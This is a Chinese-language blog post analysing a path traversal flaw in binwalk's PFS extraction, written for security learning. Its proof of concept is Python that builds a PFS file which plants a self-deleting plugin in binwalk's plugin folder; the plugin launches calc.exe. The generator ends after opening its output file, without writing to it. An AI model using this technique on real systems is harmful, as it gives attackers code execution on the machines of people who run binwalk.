> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzkxOTMzNzgxOA==&mid=2247483696&idx=1&sn=03881b0f0db49e62ce505fde9c142307&chksm=c1a2ef05f6d56613992ffc6045c8715210a1acabad606c25ac0cddf75f6b127feea7348ed42d&scene=132#wechat_redirect)

本文仅供安全学习用，不提供可能被利用来做坏事的代码。  

一、简介  

  binwalk 是一款常用的二进制文件提取工具，在固件分析和 CTF Misc 中使用广泛。在 binwalk 的 2.1.2b-2.3.2 版本中，存在一个路径穿越漏洞，允许攻击者构造恶意文件，当使用 binwalk 的 - e 选项对该恶意文件进行自动提取时，将触发漏洞，将攻击者构造的恶意文件中内嵌的文件写入提取目录之外的路径。这还可能导致远程代码执行。

二、漏洞分析

  这个漏洞源于 binwalk 解析 PFS 文件时的防路径穿越代码存在问题。它使用类似下面的代码来检测是否存在路径穿越：  

```
outfile_path = os.path.join(提取路径, PFS文件内嵌的某个文件的文件名)
if not outfile_path.startswith(提取路径): # 若是则认为存在路径穿越
    # ... 

```

  假如攻击者把 PFS 文件内嵌的某个文件的名字设置成 "../test.txt"，那么 outfile_path 为 "提取路径 /../test.txt"，第 2 行的 if 语句永远成立，故这个检测是无效的。  

  此外，binwalk 的插件存放路径下的 python 文件将被当成 binwalk 的插件，在 binwalk 每次执行的时候自动调用。所以，假如利用路径穿越漏洞将一个特制 python 脚本写入 binwalk 的插件存放路径下，即可实现 RCE。  

三、POC

  POC 编写的主要麻烦在于网上很难找到 PFS 文件格式的详细资料。幸运的是，在 Peter Lekensteyn 于 2012 年发布的这个项目中有记录 PFS 文件格式的详细信息：

```
https://lekensteyn.nl/files/pfs/pfs.txt

```

POC 代码如下：

```
def MakePfsHeader(fileNum):
    # Header
    s = "PFS/0.9".encode()
    s += b"\x00"
    s += b"\x00" * 4 # 08 - 0B
    s += b"\x00" * 2 # 0C - 0D
    s += fileNum.to_bytes(2, 'little') # 1 file (little endian)
    return s
def MakePfs(Lfile):
    file_offset = 0
    s = MakePfsHeader(len(Lfile))
    for file in Lfile:
        filename = file[0]
        if len(filename) > 0x3c:
            return b""
        s += filename.encode()
        s += (0x3c - len(filename)) * b"\x00"
        a = b"\x01\x01\x01\x01" # whatever
        s += a
        s += file_offset.to_bytes(4, 'little')
        size = len(file[1])
        file_offset += size
        s += size.to_bytes(4, 'little')
    for file in Lfile:
        s += file[1].encode()
    return s
f = open("evilPlugin.py", "r")
content = f.read()
f.close()
# [[filename1, filecontent1], [filename2, filecontent2], ..., [filenamen, filecontentn]]
Lfile = [["../../../../.config/binwalk/plugins/evilPlugins.py", content]]
s = b""
s = MakePfs(Lfile)
if s:
    f = open("test", "wb")

```

我们准备将如下代码作为写入 binwalk 插件路径下的文件内容：

```
# evilPlugins.py
import binwalk.core.plugin
import os
import shutil
class MaliciousExtractor(binwalk.core.plugin.Plugin):
    """
    Malicious binwalk plugin
    """
    def init(self):
        if not os.path.exists("c:/users/kali/Desktop/Executed.txt"):
            os.system("calc.exe")
            with open("c:/users/kali/Desktop/Executed.txt", "w") as f:
                f.write("1")
        else:
            os.remove("c:/users/kali/Desktop/Executed.txt")
            os.remove(os.path.abspath(__file__))
            shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), "__pycache__"))

```

发现这个漏洞的研究人员使用 Linux 来演示漏洞，我就用 Windows 来演示：

![](https://mmbiz.qpic.cn/mmbiz_png/yViaaeJPzALsANpftQgSlfnGefDAoOYIz8lJ6b2lA1ickVbphSCiciaL78gOlwqscibriaLExPYhZnaGgH10Z3ticaTpg/640?wx_fmt=png)

弹出了喜闻乐见的计算器。  

四、其他  

  现在最新版本的 binwalk 已经修复了该漏洞，然而据我所知 windows 上无法安装最新版本的 binwalk。建议大家还是用 Linux 来运行最新版 binwalk。  

五、参考资料

https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk